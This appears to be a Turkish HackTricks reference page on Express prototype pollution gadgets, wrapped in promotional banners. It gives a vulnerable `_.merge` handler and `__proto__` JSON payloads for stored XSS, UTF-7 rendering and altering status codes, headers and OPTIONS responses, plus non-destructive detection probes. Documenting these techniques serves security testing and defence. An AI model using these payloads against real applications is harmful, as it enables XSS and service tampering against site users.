# Express Prototype Pollution Araçları

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## XSS yanıtlarını sunun

**Daha fazla ayrıntı için [orijinal araştırmaya](https://portswigger.net/research/server-side-prototype-pollution) göz atın**

### JSON içerik türünü HTML olarak değiştirin

Bir Express uygulamasında, bir **JSON içerik türü yanıtı** kullanarak ve bir JSON yansıtarak:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Bu durumlarda JSON içerik türüyle genellikle XSS mümkün değildir. Ancak, prototip kirliliği ile Express'i **bir HTML yanıtı sunmaya kandırabiliriz.** Bu güvenlik açığı, uygulamanın **`res.send(obj)`** kullanmasına ve application/json içerik türüyle body parser'ı kullanmasına dayanır.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
**`body`** ve **`_body`** özelliklerini **kirlendirerek**, Express'in HTML içerik türünü sunmasını ve `_body` özelliğini yansıtmasını sağlamak mümkündür, bu da depolanan XSS'e neden olur.

### UTF7 Renderleme

Express'in **UTF-7 içeriği renderlaması mümkündür**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Güvenli Tarama Teknikleri

### JSON boşlukları

Aşağıdaki PP, bir JSON içindeki özniteliklere işlevselliği bozmayacak ek bir boşluk ekleyecektir:
```json
{"__proto__":{"json spaces": " "}}
```
Daha sonra yansıtılan bir JSON şu şekilde görünecektir:
```json
{"foo":  "bar"} -- Note the extra space
```
### Açığa Çıkan Başlıklar

Aşağıdaki PP aracıyla sunucu, HTTP başlığını geri gönderecektir: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
**CORS modülünün yüklü olması gerekmektedir**

### **OPTIONS Metodu**

Aşağıdaki payload ile, bir OPTIONS yanıtından bir metodun gizlenmesi mümkündür:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Durum**

Aşağıdaki PP yükü kullanılarak **döndürülen durum kodu** değiştirilebilir:
```json
{"__proto__":{"status":510}}
```
### Hata

Bir dize gibi bir ilkel değerle bir prototip atadığınızda, prototipin bir nesne olması gerektiği için bir **boş işlem üretir**. `Object.prototype`'ye kendisi gibi bir prototip nesnesi atamaya çalışırsanız, bu bir **istisna fırlatacaktır**. Bu iki davranışı kullanarak, prototip kirliliğinin başarılı olup olmadığını **tespit edebiliriz**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Yansıtılan Değer

Bir uygulama, yanıtında bir nesne içerdiğinde, `__proto__` ile birlikte **olağandışı bir isme sahip bir özelliğin** oluşturulması bilgilendirici olabilir. Özellikle, yanıtta **yalnızca olağandışı özelliğin** döndürülmesi, uygulamanın zafiyetine işaret edebilir:
```json
{"unusualName":"value","__proto__":"test"}
```
Ayrıca, Lodash gibi bir kütüphane kullanılan senaryolarda, bir özelliği hem prototip kirliliği (PP) yoluyla hem de doğrudan nesnenin içine yerleştirerek başka bir teşhis yaklaşımı sunulur. Eğer bu tür bir özellik yanıttan çıkarılırsa, bu Lodash'ın birleştirmeden önce hedef nesnede özelliğin varlığını doğruladığını gösterir:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Diğer

### Noktalara İzin Ver

Express'te, sorgu dizesi parametrelerinden nesneler oluşturmanıza izin veren bir seçenek bulunmaktadır.\
Bu seçeneği kesinlikle bir hata zincirinde kullanabilir ve bir prototip kirliliği açığından yararlanabilirsiniz.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` Node'da bir nesne oluşturur.**

## Referanslar

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin.**
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın.**

</details>
